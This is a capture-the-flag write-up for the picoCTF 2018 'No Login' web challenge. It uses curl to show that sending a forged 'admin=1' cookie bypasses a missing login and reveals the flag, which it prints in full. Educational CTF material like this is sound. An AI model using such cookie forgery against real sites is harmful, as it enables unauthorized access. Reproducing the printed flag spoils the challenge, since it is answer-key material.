# Problem
Looks like someone started making a website but never got around to making a login, but I heard there was a flag if you were the admin. [http://2018shell1.picoctf.com:39670](http://2018shell1.picoctf.com:39670)

## Hints:
What is it actually looking for in the cookie?

## Solution:

Lets try to view the website:
```bash
curl http://2018shell1.picoctf.com:39670

<!DOCTYPE html>
<html lang="en">

<head>
    <title>My New Website</title>

    <link href="http://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css" rel="stylesheet">

    <link href="https://getbootstrap.com/docs/3.3/examples/jumbotron-narrow/jumbotron-narrow.css" rel="stylesheet">

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>

    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>

</head>

<body>

    <div class="container">
        <div class="header">
            <nav>
                <ul class="nav nav-pills pull-right">
                    <li role="presentation" class="active"><a href="#">Home</a>
                    </li>
                    <li role="presentation"><a href="/unimplemented">Sign In</a>
                    </li>
                    <li role="presentation"><a href="/unimplemented">Sign Out</a>
                    </li>
                </ul>
            </nav>
            <h3 class="text-muted">My New Website</h3>
        </div>
         
        <!-- Categories: success (green), info (blue), warning (yellow), danger (red) -->
        
      
        <div class="jumbotron">
            <p class="lead"></p>
            <p><a href="/flag" class="btn btn-lg btn-success btn-block"> Flag</a></p>
        </div>


        <footer class="footer">
            <p>&copy; PicoCTF 2018</p>
        </footer>

    </div>
</body>
```

We can see a link to "flag" page, Lets check it out:
```bash
curl http://2018shell1.picoctf.com:39670/flag

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to target URL: <a href="/">/</a>.  If not click the link.
```

NADA, the hint says that the site is looking for a cookie. Lets try to send one:

OK, lets view this file:
```bash
#!/bin/bash

curl -v --cookie "admin=1" http://2018shell1.picoctf.com:39670/flag | grep picoCTF

*   Trying 18.223.208.176...
* TCP_NODELAY set
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Connected to 2018shell1.picoctf.com (18.223.208.176) port 39670 (#0)
> GET /flag HTTP/1.1
> Host: 2018shell1.picoctf.com:39670
> User-Agent: curl/7.52.1
> Accept: */*
> Cookie: admin=1
> 
< HTTP/1.1 200 OK
< Content-Type: text/html; charset=utf-8
< Content-Length: 1343
< Set-Cookie: admin=; Expires=Thu, 01-Jan-1970 00:00:00 GMT; Path=/
< 
{ [1343 bytes data]
* Curl_http_done: called premature == 0
100  1343  100  1343    0     0   4233      0 --:--:-- --:--:-- --:--:--  4277
* Connection #0 to host 2018shell1.picoctf.com left intact
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{n0l0g0n_n0_pr0bl3m_50e16a5c}</code></p>
```

Nice, we got it!

Flag: picoCTF{n0l0g0n_n0_pr0bl3m_50e16a5c}
